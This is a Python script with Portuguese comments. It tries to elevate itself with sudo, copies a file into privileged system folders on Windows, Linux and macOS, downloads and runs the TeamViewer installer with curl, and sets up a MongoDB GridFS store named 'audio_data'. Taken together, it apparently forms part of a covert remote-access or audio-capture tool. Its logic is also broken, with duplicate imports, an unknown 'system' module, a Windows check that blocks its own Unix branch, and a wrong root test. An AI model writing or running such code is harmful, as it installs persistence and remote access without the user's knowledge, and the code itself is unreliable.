import os
import sys
import platform
import requests
import zipfile
import subprocess
import platform
import requests
import zipfile
import pymongo
import gridfs
import shutil
from system import way
operational, folder, user = way()

def copy_file_to_privileged_location(file_path, target_dir):
    try:
        shutil.copy2(file_path, target_dir)
        print("Arquivo copiado com sucesso para:", target_dir)
    except PermissionError as e:
        print("Erro de permissão ao copiar o arquivo:", e)

def get_privileged_directory():
    operating_system = platform.system()
    privileged_directory = ""
    
    if operating_system == "Windows":
        privileged_directory = os.getenv("ProgramFiles")
    elif operating_system == "Linux":
        privileged_directory = "/usr/local/bin"
    elif operating_system == "Darwin":
        privileged_directory = "/Applications"
    
    return privileged_directory

def run_as_admin():
    if sys.platform != 'win32':
        raise RuntimeError('Este código só pode ser executado no Windows.')

    script_path = os.path.abspath(__file__)

    if hasattr(os, 'geteuid'):  # Para sistemas baseados em Unix, como Linux e macOS
        args = ['sudo', sys.executable] + sys.argv + [script_path]
        os.execlp('sudo', *args)

    # Resto do seu código aqui
    privileged_directory = get_privileged_directory()
    copy_file_to_privileged_location(f"{folder}", privileged_directory)

# Verificar se o script está sendo executado como administrador
if os.getpid() != 0:
    run_as_admin()
else:
    privileged_directory = get_privileged_directory()
    copy_file_to_privileged_location("caminho/para/o/arquivo", privileged_directory)

def teamviewer():
    # URL do instalador do TeamViewer
    teamviewer_installer_url = "https://download.teamviewer.com/download/TeamViewer_Setup.exe"

    # Nome do arquivo para salvar o instalador
    teamviewer_installer_file = "TeamViewer_Setup.exe"

    # Baixar o instalador do TeamViewer
    subprocess.run(["curl", "-o", teamviewer_installer_file, teamviewer_installer_url])

    # Executar o instalador
    subprocess.run([teamviewer_installer_file])

# Conectar ao banco de dados MongoDB
try:
    client = pymongo.MongoClient("mongodb://localhost:27017")
    db = client["mydatabase"]
    collection = db.get_collection("system_data")
    if collection is None:
        collection = db.create_collection("system_data")
except pymongo.errors.ConnectionError as e:
    print("Erro ao conectar ao MongoDB:", e)
    # Lógica para lidar com o erro de conexão, se necessário
fs = gridfs.GridFS(db, collection="audio_data")